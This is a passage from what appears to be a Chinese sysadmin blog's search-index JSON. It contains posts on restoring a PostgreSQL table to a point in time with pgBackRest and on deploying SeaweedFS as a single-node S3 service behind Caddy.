${PG_BACKREST_COMMAND} --stanza=${STANZA} --log-level-console=info backup --type=incr \u0026gt;\u0026gt; ${LOG_FILE} 2\u0026gt;\u0026amp;1 # 检测备份是否成功 if [ $? -eq 0 ]; then echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - Incremental Backup Completed Successfully\u0026#34; \u0026gt;\u0026gt; ${LOG_FILE} else echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - Incremental Backup Failed\u0026#34; \u0026gt;\u0026gt; ${LOG_FILE} fi 编辑crontab\n# 每周日凌晨2点执行完整备份 (full.sh) 0 2 * * 0 /path/to/full.sh # 从周一到周六凌晨2点执行增量备份 (incr.sh) 0 2 * * 1-6 /path/to/incr.sh 五、新实例postgres安装 # 这是台新的debian 12系统, 要装 postgresql 13 apt update apt upgrade apt install -y curl gpg curl -fsSL https://www.postgresql.org/media/keys/ACCC4CF8.asc | gpg --dearmor -o /etc/apt/trusted.gpg.d/postgresql.gpg echo \u0026#34;deb http://apt.postgresql.org/pub/repos/apt/ $(lsb_release -cs)-pgdg main\u0026#34; | tee /etc/apt/sources.list.d/pgdg.list apt update apt-get install postgresql-13 如上就新装了一个posgres 13\n六、新实例安装pgbackrest systemctl stop postgresql apt install pgbackrest vi /etc/pgbackrest.conf [main] pg1-path=/var/lib/postgresql/13/main pg1-port=5432 [global] repo1-path=/var/lib/pgbackrest log-level-console=info log-level-file=info sudo systemctl start postgresq 六、准备恢复环境的数据 要把数pgbackrest的数据同步到新实例上： # 使用 rsync（推荐） sudo rsync -avz /var/lib/pgbackrest/ \u0026lt;new_instance_user\u0026gt;@\u0026lt;new_instance_ip\u0026gt;:/var/lib/pgbackrest/ # 或者，使用 scp sudo scp -r /var/lib/pgbackrest/ \u0026lt;new_instance_user\u0026gt;@\u0026lt;new_instance_ip\u0026gt;:/var/lib/pgbackrest/ # 设置正确权限 chown -R postgres:postgres /var/lib/pgbackrest chmod 750 /var/lib/pgbackrest 七、新实例上执行恢复到时间点 sudo -u postgres pgbackrest --stanza=main \\ --target=\u0026#34;2025-09-15 14:00:00\u0026#34; \\ --target-action=promote \\ --delta restore --log-level-console=info 参数说明： --stanza=main：指定备份配置的名称。 --target：设置时间点。 --target-action=promote：让恢复完成后实例成为主实例。 --delta：只恢复有变更的数据（提高恢复速度）。 systemctl start postgresql 八、把新实例上的数据dump出来 # 使用 psql 从恢复的数据库导出目标表数据。假设你要恢复的表名是 public.my_table，你可以导出它的数据为 SQL 脚本： pg_dump -U postgres -t public.my_table my_database \u0026gt; my_table_data.sql # 或者选择仅导出某些行数据（比如按时间条件筛选）到 SQL 脚本中： psql -U postgres -d my_database -c \u0026#34;\\copy (SELECT * FROM public.my_table WHERE created_at BETWEEN \u0026#39;2023-09-30\u0026#39; AND \u0026#39;2023-10-01\u0026#39;) TO \u0026#39;/tmp/my_table_data.csv\u0026#39; WITH CSV HEADER\u0026#34; 然后去旧实例上，灌入数据\n# 建同样的表 CREATE TABLE public.my_table_recovery (LIKE public.my_table INCLUDING ALL); # 修改语句 sed -i \u0026#39;s/old_table/new_table/g\u0026#39; my_table_data.sql # 导sql psql -U postgres -d my_database -f my_table_data.sql # 导数据 # 同样要修改CSV的！！！ \\copy public.my_table_recovery FROM \u0026#39;/tmp/my_table_data.csv\u0026#39; WITH CSV HEADER 这样就ok了。\n","permalink":"https://rendoumi.com/posts/20250915-pgbackrest_restore/","summary":"\u003cp\u003e最近狠折腾了一通postgres的备份，跟MySQL的阿里RDB恢复一样，如何不停止数据库服务，恢复某个表的数据到某个时间点，然后放到另一个表中呢？\u003c/p\u003e\n\u003cp\u003e其实用之前的wal恢复一样的，就是要把当天实例的全备份和wal都复制到另外一台上，然后恢复，再把数据给dump下来，再建一个新表，把数据导回去。\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"/posts/20250728-postgres_wal_pitr/\"\u003ePostgres的wal和PITR时间点恢复\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e用pgbackrest感觉会好一些，其实都差不多，步骤如下：\u003c/p\u003e\n\u003ch5 id=\"一安装并配置pgbackrest\"\u003e一、安装并配置pgbackrest\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 建立备份的大本营\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /var/lib/pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e750\u003c/span\u003e /var/lib/pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echown postgres:postgres /var/lib/pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 编辑 /etc/pgbackrest.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eglobal\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erepo1-path\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/lib/pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erepo1-retention-full\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e26\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erepo1-retention-archive\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e180\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-level-file\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-level-console\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eglobal:archive-push\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecompress-level\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emain\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg1-path\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/lib/postgresql/13/main\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg1-port\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5432\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e讲解一下参数\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eglobal里面是全局配置\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo1-path\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e/var/lib/pgbackrest   # pgBackRest 存储库路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo1-retention-full\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e26          # 保留最近的 26 个全量备份，大概6个月，180天\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo1-retention-archive\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e180      # 保留最近 180 天的 WAL 日志\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elog-level-file\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003einfo              # 文件日志级别\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elog-level-console\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003einfo           # 控制台日志级别\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eglobal:archive-push 设置的是wal归档的保存方式是压缩保存\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emain部分设置的是要备份的postgres源的路径和端口，【main】是stanza的名字\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e上面的备份其实有三种备份，full和incr和wal备份，那如果full和增量都没了，只要wal还在，那么依然能恢复到180天之内的某个时间点。wal很占空间，full也很占空间，一定要算准了。\u003c/p\u003e\n\u003cp\u003e那其实pgbackrest是用postgres身份去执行命令的，所以不用认证身份。\u003c/p\u003e\n\u003ch5 id=\"二配置postgres\"\u003e二、配置postgres\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/postgresql/13/main/postgresql.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# wal归档方法：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#archive_mode = on\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#archive_command = \u0026#39;cp %p /data/backup/%f\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# pgbackrest归档方法：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003earchive_mode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e on                  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003earchive_command\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;pgbackrest --stanza=main archive-push %p\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ewal_level\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e replica   \u003cspan class=\"c1\"\u003e#备份级别是副本\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emax_wal_senders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e3\u003c/span\u003e   \u003cspan class=\"c1\"\u003e#最多wal日志发到3个客户端去\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 需要重启postgres\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart postgresql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"三测试pgbackrest的备份功能\"\u003e三、测试pgbackrest的备份功能\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# 建立一个stanza\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  sudo -u postgres pgbackrest --stanza\u003cspan class=\"o\"\u003e=\u003c/span\u003emain --log-level-console\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo stanza-create\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# 检查\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  sudo -u postgres pgbackrest --stanza\u003cspan class=\"o\"\u003e=\u003c/span\u003emain --log-level-console\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo check\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# 查看信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  sudo -u postgres pgbackrest info\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20250915200557932\" loading=\"lazy\" src=\"/posts/20250915-pgbackrest_restore/image-20250915200557932.png\"\u003e\u003c/p\u003e","title":"Postgres pgbackrest备份以及指定时间点恢复"},{"content":"公司要做系统迁移，从AWS迁移到自建机房，那迁移的项目就一大堆，S3也在其中之列。\n找来找去，第一首选的替代软件是minio，可是万恶的minio团队在这个时间点，已经后台移除了 admin 相关的操作权限\n要想用呢，只能用个老版本的：quay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z\n那只能再找了，于是找到了SeaweedFS，这个软件其实是个彻头彻尾的单文件，但是分布式全集群架构\n简单的说，就是一个软件，包含了10几种功能。\n而我们呢，其实就要它的一个功能s3，而且要用于生产。网上一大堆的教程都是各种分布式的部署，如果机器足够，大家可以参考网上教程。\n我们单台机器，硬盘底层是raid10，然后上层就只提供s3，而且要配置简单，没有什么安全问题，这台机器是直接暴露公网IP的。\n那最简单的方法就是Docker compose，而且只放开s3的指定端口：\nservices: seaweedfs-s3: image: chrislusf/seaweedfs container_name: seaweedfs-s3 volumes: - ./data:/data - ./config/config.json:/seaweedfs/config.json ports: - \u0026#34;127.0.0.1:8333:8333\u0026#34; # - \u0026#34;9333:9333\u0026#34; entrypoint: /bin/sh -c command: | \u0026#34;echo \u0026#39;Starting SeaweedFS S3 server\u0026#39; \u0026amp;\u0026amp; \\ weed server -dir=/data -volume.max=120 -s3 -s3.config /seaweedfs/config.json\u0026#34; restart: unless-stopped 仔细解释上面的参数：\nports 只开了 127.0.0.1:8333 的S3端口，其它都不开，如果需要查看服务状态，可以临时打开9333端口查看，看完再关 -volume.max=120，这个务必要注意，seaweed是分卷的，一个卷最多30G，缺省是8个卷。那缺省就是只有240G的容量，我们的硬盘是4T的，剩余3.7TB，那算下来，30*120=3600G=3.6T。这样就对准了，这个参数一定要根据生产的实际情况进行调整. 另外还把config.json的配置文件给mount入docker卷中了，配置文件里放的就是S3的IAM访问权限控制 详细看一下config.json\n{ \u0026#34;identities\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;credentials\u0026#34;: [ { \u0026#34;accessKey\u0026#34;: \u0026#34;aaa\u0026#34;, \u0026#34;secretKey\u0026#34;: \u0026#34;bbb\u0026#34; } ], \u0026#34;actions\u0026#34;: [ \u0026#34;Admin\u0026#34;, \u0026#34;Read\u0026#34;, \u0026#34;List\u0026#34;, \u0026#34;Tagging\u0026#34;, \u0026#34;Write\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;goods\u0026#34;, \u0026#34;credentials\u0026#34;: [ { \u0026#34;accessKey\u0026#34;: \u0026#34;ccc\u0026#34;, \u0026#34;secretKey\u0026#34;: \u0026#34;ddd\u0026#34; } ], \u0026#34;actions\u0026#34;: [ \u0026#34;Read:goods\u0026#34;, \u0026#34;Write:goods\u0026#34;, \u0026#34;List:goods\u0026#34;, \u0026#34;Tagging:goods\u0026#34;, \u0026#34;Admin:goods\u0026#34; ] } ] } 解释一下，上面定义了一个admin用户，可以对所有s3进行读写和管理。\n然后又定义了一个goods用户，它只对goods桶有权限。\n那seaweed的桶和权限实际是分开的，管理的时候可以先建桶，然后在配置文件里再配置权限，最后重载docker compose up -d即可\n大家肯定也注意到了，端口映射只开了127.0.0.1:8333，这是因为http端口，前面需要套个https才能放到生产环境。\n那前置代理https，就套用Caddy好了，配置文件Caddyfile也巨简单, 就三行：\ns3.rendoumi.com { reverse_proxy 127.0.0.1:8333 } 那我们管理的时候就用minio的客户端mc即可\nmc alias set mys3 https://s3.rendoumi.com aaa bbb mc ls mys3/goods mc mb newgoods mys3 mc ls mys3/newgoods 最后，如果要从S3同步文件，那就用 JuiceFS 的 juicesync 这个软件即可。\n","permalink":"https://rendoumi.com/posts/20250915-seeweed_single_deploy/","summary":"\u003cp\u003e公司要做系统迁移，从AWS迁移到自建机房，那迁移的项目就一大堆，S3也在其中之列。\u003c/p\u003e\n\u003cp\u003e找来找去，第一首选的替代软件是minio，可是万恶的minio团队在这个时间点，已经后台移除了 admin 相关的操作权限\u003c/p\u003e\n\u003cp\u003e要想用呢，只能用个老版本的：\u003ca href=\"http://quay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z\"\u003equay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e那只能再找了，于是找到了SeaweedFS，这个软件其实是个彻头彻尾的单文件，但是分布式全集群架构\u003c/p\u003e\n\u003cp\u003e简单的说，就是一个软件，包含了10几种功能。\u003c/p\u003e\n\u003cp\u003e而我们呢，其实就要它的一个功能s3，而且要用于生产。网上一大堆的教程都是各种分布式的部署，如果机器足够，大家可以参考网上教程。\u003c/p\u003e\n\u003cp\u003e我们单台机器，硬盘底层是raid10，然后上层就只提供s3，而且要配置简单，没有什么安全问题，这台机器是直接暴露公网IP的。\u003c/p\u003e\n\u003cp\u003e那最简单的方法就是Docker compose，而且只放开s3的指定端口：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  seaweedfs-s3:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: chrislusf/seaweedfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: seaweedfs-s3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - ./data:/data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - ./config/config.json:/seaweedfs/config.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;127.0.0.1:8333:8333\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# - \u0026#34;9333:9333\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    entrypoint: /bin/sh -c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;echo \u0026#39;Starting SeaweedFS S3 server\u0026#39; \u0026amp;\u0026amp; \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e      weed server -dir=/data -volume.max=120 -s3 -s3.config /seaweedfs/config.json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: unless-stopped\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e仔细解释上面的参数：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eports 只开了 127.0.0.1:8333 的S3端口，其它都不开，如果需要查看服务状态，可以临时打开9333端口查看，看完再关\u003c/li\u003e\n\u003cli\u003e-volume.max=120，这个务必要注意，seaweed是分卷的，一个卷最多30G，缺省是8个卷。那缺省就是只有240G的容量，我们的硬盘是4T的，剩余3.7TB，那算下来，30*120=3600G=3.6T。这样就对准了，这个参数一定要根据生产的实际情况进行调整.\u003c/li\u003e\n\u003cli\u003e另外还把config.json的配置文件给mount入docker卷中了，配置文件里放的就是S3的IAM访问权限控制\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e详细看一下config.json\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;identities\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;admin\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;credentials\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s2\"\u003e\u0026#34;accessKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;aaa\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s2\"\u003e\u0026#34;secretKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;bbb\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;actions\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Admin\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Read\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;List\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Tagging\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;Write\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;goods\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;credentials\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s2\"\u003e\u0026#34;accessKey\u0026#34;\u003c/span\u003e: \u003cspan 